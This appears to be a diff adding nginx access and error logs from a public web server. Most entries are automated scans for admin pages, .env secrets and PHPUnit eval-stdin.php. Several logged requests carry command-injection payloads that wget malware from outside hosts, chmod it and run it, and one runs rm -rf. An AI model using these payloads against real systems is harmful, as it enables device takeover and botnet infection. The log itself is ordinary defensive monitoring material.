@@ -1,0 +1,420 @@
+----------------------------------------
+/var/log/nginx/access.log
+----------------------------------------
+205.210.31.154 - - [29/May/2026:05:25:56 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xFA\x03o\xB7\xEF\xEA\xFAf\xC8+\xC9\xEC\xD8EF\xDE\xBC\xF1\xAC\x0C)\xBC\xEF0\xF48\x92\xDE\x13{3\x22\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 150 "-" "-" "-"
+205.210.31.154 - - [29/May/2026:05:25:56 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03=\xC3b\xA7\x13\xFD\xF1\xCB=Za\xC5;\xE7\x88\x84-\xD3wt\xD0\xAAA|\xE4 \x1BB\x03'\x0E\xC5 \xA47\xA3\xF0\xAEp\xF6j\xEE\xC7\xDB?\x04\xAA,\x10\x10/O\xA8}\xB2\x80\x8Bm9\x12\x89\xB8\x19\xE0=\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 150 "-" "-" "-"
+47.88.103.19 - - [29/May/2026:05:28:11 +0000] "GET / HTTP/1.1" 200 12 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 11) AppleWebKit/538.41 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36" "-"
+47.88.103.19 - - [29/May/2026:05:28:11 +0000] "GET /favicon.ico HTTP/1.1" 404 74 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36" "-"
+103.126.4.59 - - [29/May/2026:05:51:29 +0000] "GET / HTTP/1.0" 400 0 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/" "-"
+216.180.246.201 - - [29/May/2026:05:52:17 +0000] "GET / HTTP/1.0" 400 0 "-" "Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)" "-"
+216.180.246.201 - - [29/May/2026:05:53:25 +0000] "GET / HTTP/1.0" 400 0 "-" "Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)" "-"
+216.180.246.201 - - [29/May/2026:05:53:35 +0000] "\x16\x03\x01\x00\xFD\x01\x00\x00\xF9\x03\x03\x93\x01\x82\x1Eo\xBB\x5C\x9E\xF2\x9C0b\x8E\xA7\xD94*\xCAx\x9F\xB0e\x99\xEE\xE5\x01\xB86X\xFD\xB8\xF1 \xC6:\xE5\x13\xDF\xD2\x91\xB7)\xF1\xD7z\xD0x\xA0V\x02\x0C\xB65\xCC\x89\xCE\xC4\xCCd<\xBA\xBA\x8Dm\xA5\x00&\xCC\xA8\xCC\xA9\xC0/\xC00\xC0+\xC0,\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-" "-"
+216.180.246.201 - - [29/May/2026:05:53:53 +0000] "GET / HTTP/1.1" 200 12 "-" "Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)" "-"
+216.180.246.201 - - [29/May/2026:05:53:53 +0000] "GET /manage/account/login HTTP/1.1" 404 83 "-" "Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)" "-"
+216.180.246.201 - - [29/May/2026:05:53:53 +0000] "GET /admin/index.html HTTP/1.1" 404 79 "-" "Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)" "-"
+216.180.246.201 - - [29/May/2026:05:53:53 +0000] "GET /index.html HTTP/1.1" 404 73 "-" "Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)" "-"
+216.180.246.201 - - [29/May/2026:05:53:53 +0000] "GET /+CSCOE+/logon.html HTTP/1.1" 404 81 "-" "Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)" "-"
+216.180.246.201 - - [29/May/2026:05:53:54 +0000] "GET /cgi-bin/login.cgi HTTP/1.1" 404 80 "-" "Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)" "-"
+216.180.246.201 - - [29/May/2026:05:53:55 +0000] "GET /login.htm HTTP/1.1" 404 72 "-" "Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)" "-"
+216.180.246.201 - - [29/May/2026:05:54:00 +0000] "GET /login.html HTTP/1.1" 404 73 "-" "Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)" "-"
+216.180.246.201 - - [29/May/2026:05:54:10 +0000] "GET /login.jsp HTTP/1.1" 404 72 "-" "Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)" "-"
+43.159.152.184 - - [29/May/2026:06:07:39 +0000] "GET / HTTP/1.1" 200 12 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
+147.45.133.132 - - [29/May/2026:06:37:19 +0000] "GET / HTTP/1.1" 200 12 "-" "Go-http-client/1.1" "-"
+120.238.6.206 - - [29/May/2026:06:43:38 +0000] "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=cd%20%2Ftmp%3B%20busybox%20rm%20tbk.sh%3B%20wget%20http%3A%2F%2F130.12.180.120%3A8080%2Ffile%2Ftbk.sh%3B%20busybox%20sh%20tbk.sh HTTP/1.1" 404 251 "-" "DatasurgeOnTop" "-"
+217.142.25.132 - - [29/May/2026:06:50:38 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://140.233.190.47/dlink%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$ HTTP/1.1" 400 150 "-" "terrabot-owned-you" "-"
+73.210.214.170 - - [29/May/2026:07:10:58 +0000] "GET / HTTP/1.1" 200 12 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+78.190.101.198 - - [29/May/2026:07:10:58 +0000] "GET /config HTTP/1.1" 404 69 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+89.93.66.135 - - [29/May/2026:07:10:59 +0000] "GET /.env HTTP/1.1" 404 67 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+194.35.235.215 - - [29/May/2026:07:11:00 +0000] "GET /.env.local HTTP/1.1" 404 73 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+170.231.129.228 - - [29/May/2026:07:11:01 +0000] "GET /.env.production HTTP/1.1" 404 78 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+177.131.59.243 - - [29/May/2026:07:11:02 +0000] "GET /.env.development HTTP/1.1" 404 79 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+103.47.181.106 - - [29/May/2026:07:11:03 +0000] "GET /.env.dev HTTP/1.1" 404 71 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+95.144.116.27 - - [29/May/2026:07:11:04 +0000] "GET /.env.prod HTTP/1.1" 404 72 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+103.67.85.22 - - [29/May/2026:07:11:05 +0000] "GET /.env.test HTTP/1.1" 404 72 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+90.214.115.129 - - [29/May/2026:07:11:06 +0000] "GET /.env.staging HTTP/1.1" 404 75 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+103.15.245.71 - - [29/May/2026:07:11:07 +0000] "GET /.env.backup HTTP/1.1" 404 74 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+131.196.162.119 - - [29/May/2026:07:11:08 +0000] "GET /.env.save HTTP/1.1" 404 72 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+103.165.4.36 - - [29/May/2026:07:11:10 +0000] "GET /.env.old HTTP/1.1" 404 71 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+179.222.237.174 - - [29/May/2026:07:11:11 +0000] "GET /.env.bak HTTP/1.1" 404 71 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+103.3.222.43 - - [29/May/2026:07:11:12 +0000] "GET /.env.tmp HTTP/1.1" 404 71 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+223.181.20.85 - - [29/May/2026:07:11:13 +0000] "GET /.env.swp HTTP/1.1" 404 71 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+177.157.157.119 - - [29/May/2026:07:11:14 +0000] "GET /.env~ HTTP/1.1" 404 68 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+157.100.142.13 - - [29/May/2026:07:11:15 +0000] "GET /.env.example HTTP/1.1" 404 75 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+136.158.37.252 - - [29/May/2026:07:11:16 +0000] "GET /.env.sample HTTP/1.1" 404 74 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+138.59.127.148 - - [29/May/2026:07:11:17 +0000] "GET /.env.dist HTTP/1.1" 404 72 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+152.59.87.217 - - [29/May/2026:07:11:20 +0000] "GET /.env.template HTTP/1.1" 404 76 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+49.204.128.167 - - [29/May/2026:07:11:21 +0000] "GET /.env.production.local HTTP/1.1" 404 84 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+111.119.178.217 - - [29/May/2026:07:11:22 +0000] "GET /.env.development.local HTTP/1.1" 404 85 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+212.95.133.126 - - [29/May/2026:07:11:32 +0000] "GET /.env.test.local HTTP/1.1" 404 78 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+150.228.105.252 - - [29/May/2026:07:11:51 +0000] "GET /.envrc HTTP/1.1" 404 69 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+89.151.188.27 - - [29/May/2026:07:12:32 +0000] "GET / HTTP/1.1" 200 12 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+190.58.15.2 - - [29/May/2026:07:12:43 +0000] "GET /config HTTP/1.1" 404 69 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+179.54.144.170 - - [29/May/2026:07:12:45 +0000] "GET /.env HTTP/1.1" 404 67 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+103.206.38.13 - - [29/May/2026:07:12:46 +0000] "GET /.env.local HTTP/1.1" 404 73 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+132.255.38.206 - - [29/May/2026:07:12:47 +0000] "GET /.env.production HTTP/1.1" 404 78 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+103.158.91.46 - - [29/May/2026:07:12:48 +0000] "GET /.env.development HTTP/1.1" 404 79 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+113.211.100.246 - - [29/May/2026:07:12:49 +0000] "GET /.env.dev HTTP/1.1" 404 71 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+45.142.89.141 - - [29/May/2026:07:12:51 +0000] "GET /.env.prod HTTP/1.1" 404 72 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+187.180.190.155 - - [29/May/2026:07:12:52 +0000] "GET /.env.test HTTP/1.1" 404 72 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+189.219.120.90 - - [29/May/2026:07:12:53 +0000] "GET /.env.staging HTTP/1.1" 404 75 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+103.178.135.9 - - [29/May/2026:07:12:55 +0000] "GET /.env.backup HTTP/1.1" 404 74 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+5.27.25.109 - - [29/May/2026:07:12:57 +0000] "GET /.env.save HTTP/1.1" 404 72 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+115.99.41.239 - - [29/May/2026:07:13:22 +0000] "GET /.env.old HTTP/1.1" 404 71 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+201.164.65.194 - - [29/May/2026:07:13:24 +0000] "GET /.env.bak HTTP/1.1" 404 71 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+189.6.215.28 - - [29/May/2026:07:13:26 +0000] "GET /.env.tmp HTTP/1.1" 404 71 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+88.238.10.242 - - [29/May/2026:07:13:28 +0000] "GET /.env.swp HTTP/1.1" 404 71 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+181.78.22.252 - - [29/May/2026:07:13:29 +0000] "GET /.env~ HTTP/1.1" 404 68 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+69.142.41.239 - - [29/May/2026:07:13:30 +0000] "GET /.env.example HTTP/1.1" 404 75 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+39.48.13.90 - - [29/May/2026:07:13:31 +0000] "GET /.env.sample HTTP/1.1" 404 74 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36" "-"
+34.77.219.71 - - [29/May/2026:08:30:20 +0000] "GET / HTTP/1.1" 200 12 "-" "python-requests/2.32.5" "-"
+37.60.250.226 - - [29/May/2026:08:32:44 +0000] "GET http://37.60.250.226:7878/echo?nonce=a4272qakupj104e4 HTTP/1.1" 404 90 "-" "proxyd/0.1" "-"
+37.60.250.226 - - [29/May/2026:08:32:44 +0000] "\x05\x01\x00" 400 150 "-" "-" "-"
+150.228.181.35 - - [29/May/2026:08:47:22 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 140.233.190.47/jaws;chmod+777+jaws;sh+jaws;./jaws; HTTP/1.1" 400 150 "-" "-" "-"
+34.77.191.38 - - [29/May/2026:09:14:33 +0000] "GET / HTTP/1.1" 200 12 "-" "python-requests/2.32.5" "-"
+210.87.84.86 - - [29/May/2026:09:19:38 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 400 150 "-" "terrabot-owned-you" "-"
+43.131.45.213 - - [29/May/2026:10:03:10 +0000] "GET / HTTP/1.1" 200 12 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
+93.174.93.12 - - [29/May/2026:10:04:58 +0000] "GET / HTTP/1.0" 400 0 "-" "Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.8.1.13) Gecko/20080313 Iceape/1.1.9 (Debian-1.1.9-5)" "-"
+13.89.124.209 - - [29/May/2026:10:17:48 +0000] "GET / HTTP/1.1" 200 12 "-" "Mozilla/5.0 zgrab/0.x" "-"
+176.65.139.66 - - [29/May/2026:11:22:56 +0000] "GET / HTTP/1.0" 200 12 "-" "Shodan-Pull/1.0" "-"
+45.205.1.71 - - [29/May/2026:11:56:11 +0000] "GET / HTTP/1.1" 400 150 "-" "curl/7.68.0" "-"
+204.76.203.10 - - [29/May/2026:12:02:03 +0000] "GET / HTTP/1.1" 400 150 "-" "curl/7.68.0" "-"
+45.41.105.49 - - [29/May/2026:12:15:19 +0000] "GET /ping.cgi?pingIpAddress=google.fr;wget%20http://85.11.167.101/arm7%20-O%20/tmp/arm7;chmod%20777%20/tmp/arm7;/tmp/arm7;wget%20http://85.11.167.101/arm64%20-O%20/tmp/arm64;chmod%20777%20/tmp/arm64;/tmp/arm64;wget%20http://85.11.167.101/mips%20-O%20/tmp/mips;chmod%20777%20/tmp/mips;/tmp/mips%27/&sessionKey=1039 HTTP/1.1" 400 150 "-" "r00ts3c" "-"
+47.74.33.138 - - [29/May/2026:12:21:47 +0000] "GET / HTTP/1.1" 200 12 "-" "curl/7.78.0" "-"
+130.176.214.243 - - [29/May/2026:13:28:36 +0000] "OPTIONS /api/tenant/config HTTP/1.1" 204 0 "https://app.systia.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0" "186.125.92.179"
+130.176.214.243 - - [29/May/2026:13:28:36 +0000] "GET /api/tenant/config HTTP/1.1" 401 43 "https://app.systia.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0" "186.125.92.179"
+130.176.214.243 - - [29/May/2026:13:28:36 +0000] "OPTIONS /fhir/r4/MedicationRequest?status=draft HTTP/1.1" 204 0 "https://app.systia.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0" "186.125.92.179"
+130.176.214.243 - - [29/May/2026:13:28:36 +0000] "GET /fhir/r4/MedicationRequest?status=draft HTTP/1.1" 401 43 "https://app.systia.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0" "186.125.92.179"
+130.176.214.243 - - [29/May/2026:13:29:39 +0000] "OPTIONS /fhir/r4/Patient HTTP/1.1" 204 0 "https://app.systia.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0" "186.125.92.179"
+130.176.214.243 - - [29/May/2026:13:29:39 +0000] "GET /fhir/r4/Patient HTTP/1.1" 401 43 "https://app.systia.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0" "186.125.92.179"
+130.176.214.243 - - [29/May/2026:13:29:43 +0000] "GET /fhir/r4/Patient HTTP/1.1" 401 43 "https://app.systia.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0" "186.125.92.179"
+130.176.214.243 - - [29/May/2026:13:30:05 +0000] "OPTIONS /fhir/r4/Patient HTTP/1.1" 204 0 "https://app.systia.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0" "186.125.92.179"
+130.176.214.243 - - [29/May/2026:13:30:06 +0000] "POST /fhir/r4/Patient HTTP/1.1" 401 43 "https://app.systia.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0" "186.125.92.179"
+130.176.214.243 - - [29/May/2026:13:30:41 +0000] "OPTIONS /api/tenant/config HTTP/1.1" 204 0 "https://app.systia.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0" "186.125.92.179"
+130.176.214.243 - - [29/May/2026:13:30:41 +0000] "GET /api/tenant/config HTTP/1.1" 401 43 "https://app.systia.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0" "186.125.92.179"
+130.176.214.243 - - [29/May/2026:13:30:41 +0000] "OPTIONS /fhir/r4/MedicationRequest?status=draft HTTP/1.1" 204 0 "https://app.systia.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0" "186.125.92.179"
+130.176.214.237 - - [29/May/2026:13:30:41 +0000] "GET /fhir/r4/MedicationRequest?status=draft HTTP/1.1" 401 43 "https://app.systia.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0" "186.125.92.179"
+130.176.214.243 - - [29/May/2026:13:31:18 +0000] "OPTIONS /fhir/r4/Patient HTTP/1.1" 204 0 "https://app.systia.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0" "186.125.92.179"
+130.176.214.243 - - [29/May/2026:13:31:18 +0000] "POST /fhir/r4/Patient HTTP/1.1" 401 43 "https://app.systia.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0" "186.125.92.179"
+130.176.214.243 - - [29/May/2026:13:37:07 +0000] "OPTIONS /api/tenant/config HTTP/1.1" 204 0 "https://app.systia.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0" "186.125.92.179"
+130.176.214.243 - - [29/May/2026:13:37:07 +0000] "GET /api/tenant/config HTTP/1.1" 200 541 "https://app.systia.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0" "186.125.92.179"
+130.176.214.237 - - [29/May/2026:13:37:07 +0000] "OPTIONS /fhir/r4/MedicationRequest?status=draft HTTP/1.1" 204 0 "https://app.systia.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0" "186.125.92.179"
+130.176.214.237 - - [29/May/2026:13:37:08 +0000] "GET /fhir/r4/MedicationRequest?status=draft HTTP/1.1" 500 52 "https://app.systia.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0" "186.125.92.179"
+130.176.214.243 - - [29/May/2026:13:37:42 +0000] "OPTIONS /fhir/r4/Patient HTTP/1.1" 204 0 "https://app.systia.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0" "186.125.92.179"
+130.176.214.243 - - [29/May/2026:13:37:43 +0000] "POST /fhir/r4/Patient HTTP/1.1" 500 52 "https://app.systia.ar/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0" "186.125.92.179"
+
+
+----------------------------------------
+/var/log/nginx/error.log
+----------------------------------------
+2026/05/28 23:48:59 [error] 18558#18558: *11 connect() failed (111: Connection refused) while connecting to upstream, client: 101.47.8.187, server: , request: "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", upstream: "http://127.0.0.1:8080/testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", host: "32.196.153.163:80"
+2026/05/28 23:49:00 [error] 18558#18558: *11 connect() failed (111: Connection refused) while connecting to upstream, client: 101.47.8.187, server: , request: "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", upstream: "http://127.0.0.1:8080/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", host: "32.196.153.163:80"
+2026/05/28 23:49:00 [error] 18558#18558: *11 connect() failed (111: Connection refused) while connecting to upstream, client: 101.47.8.187, server: , request: "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", upstream: "http://127.0.0.1:8080/demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", host: "32.196.153.163:80"
+2026/05/28 23:49:01 [error] 18558#18558: *11 connect() failed (111: Connection refused) while connecting to upstream, client: 101.47.8.187, server: , request: "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", upstream: "http://127.0.0.1:8080/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", host: "32.196.153.163:80"
+2026/05/28 23:49:01 [error] 18558#18558: *11 connect() failed (111: Connection refused) while connecting to upstream, client: 101.47.8.187, server: , request: "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", upstream: "http://127.0.0.1:8080/crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", host: "32.196.153.163:80"
+2026/05/28 23:49:02 [error] 18558#18558: *11 connect() failed (111: Connection refused) while connecting to upstream, client: 101.47.8.187, server: , request: "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", upstream: "http://127.0.0.1:8080/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", host: "32.196.153.163:80"
